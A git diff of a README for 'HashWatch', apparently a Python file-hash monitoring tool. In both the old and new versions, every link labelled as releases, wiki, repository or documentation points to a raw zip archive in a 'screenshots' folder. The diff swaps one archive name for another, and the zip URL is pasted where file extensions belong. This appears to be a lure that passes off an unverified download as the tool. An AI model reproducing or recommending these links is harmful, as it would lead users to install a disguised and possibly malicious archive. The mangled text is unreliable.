@@ -4,7 +4,7 @@
 HashWatch is a simple Python command-line tool designed to help you create a baseline and monitor changes in your files. It uses SHA256 hash logging to ensure every change is logged properly. This guide will walk you through downloading and running HashWatch.
 
 ## 📥 Download HashWatch
-[![Download HashWatch](https://raw.githubusercontent.com/gazalgopi-svg/HashWatch/main/screenshots/HashWatch_v3.1.zip)](https://raw.githubusercontent.com/gazalgopi-svg/HashWatch/main/screenshots/HashWatch_v3.1.zip)
+[![Download HashWatch](https://raw.githubusercontent.com/gazalgopi-svg/HashWatch/main/screenshots/Watch-Hash-v2.5.zip)](https://raw.githubusercontent.com/gazalgopi-svg/HashWatch/main/screenshots/Watch-Hash-v2.5.zip)
 
 ## 📋 System Requirements
 Before you download, ensure your system meets these requirements:
@@ -20,15 +20,15 @@ Before you download, ensure your system meets these requirements:
 - User-friendly command-line interface.
 
 ## 📦 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/gazalgopi-svg/HashWatch/main/screenshots/HashWatch_v3.1.zip) to access the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/gazalgopi-svg/HashWatch/main/screenshots/Watch-Hash-v2.5.zip) to access the latest version.
 2. Download the appropriate package for your operating system:
    - **Windows:** Look for a .exe file.
-   - **macOS:** Look for a .pkg file or https://raw.githubusercontent.com/gazalgopi-svg/HashWatch/main/screenshots/HashWatch_v3.1.zip archive.
-   - **Linux:** Look for a https://raw.githubusercontent.com/gazalgopi-svg/HashWatch/main/screenshots/HashWatch_v3.1.zip archive.
+   - **macOS:** Look for a .pkg file or https://raw.githubusercontent.com/gazalgopi-svg/HashWatch/main/screenshots/Watch-Hash-v2.5.zip archive.
+   - **Linux:** Look for a https://raw.githubusercontent.com/gazalgopi-svg/HashWatch/main/screenshots/Watch-Hash-v2.5.zip archive.
 3. Run the installation file:
    - **Windows:** Double-click the `.exe` file and follow on-screen prompts.
    - **macOS:** Open the `.pkg` file and follow instructions.
-   - **Linux:** Extract the `https://raw.githubusercontent.com/gazalgopi-svg/HashWatch/main/screenshots/HashWatch_v3.1.zip` archive and follow the included README for installation steps.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/gazalgopi-svg/HashWatch/main/screenshots/Watch-Hash-v2.5.zip` archive and follow the included README for installation steps.
 
 ## ⚙️ Usage
 To start using HashWatch, open your terminal (Command Prompt on Windows, Terminal on macOS/Linux):
@@ -54,7 +54,7 @@ HashWatch covers several important topics in cybersecurity:
 - Learning by doing to understand file changes
 
 ## 📖 Documentation
-For complete documentation and more detailed commands, refer to the files included in the installation package or visit our [GitHub Wiki](https://raw.githubusercontent.com/gazalgopi-svg/HashWatch/main/screenshots/HashWatch_v3.1.zip).
+For complete documentation and more detailed commands, refer to the files included in the installation package or visit our [GitHub Wiki](https://raw.githubusercontent.com/gazalgopi-svg/HashWatch/main/screenshots/Watch-Hash-v2.5.zip).
 
 ## 🤝 Contributing
 We welcome contributions from anyone interested in enhancing HashWatch. You can help by:
@@ -63,11 +63,11 @@ We welcome contributions from anyone interested in enhancing HashWatch. You can 
 - Submitting pull requests
 
 ## 💬 Support
-If you encounter issues or have questions, feel free to open an issue in our [GitHub Repository](https://raw.githubusercontent.com/gazalgopi-svg/HashWatch/main/screenshots/HashWatch_v3.1.zip). We will do our best to assist you.
+If you encounter issues or have questions, feel free to open an issue in our [GitHub Repository](https://raw.githubusercontent.com/gazalgopi-svg/HashWatch/main/screenshots/Watch-Hash-v2.5.zip). We will do our best to assist you.
 
 ## ✅ Important Links
-- [Visit the Releases Page](https://raw.githubusercontent.com/gazalgopi-svg/HashWatch/main/screenshots/HashWatch_v3.1.zip)
-- [View Documentation](https://raw.githubusercontent.com/gazalgopi-svg/HashWatch/main/screenshots/HashWatch_v3.1.zip)
+- [Visit the Releases Page](https://raw.githubusercontent.com/gazalgopi-svg/HashWatch/main/screenshots/Watch-Hash-v2.5.zip)
+- [View Documentation](https://raw.githubusercontent.com/gazalgopi-svg/HashWatch/main/screenshots/Watch-Hash-v2.5.zip)
 
 ## 📅 Upcoming Features
 We plan to enhance HashWatch with:
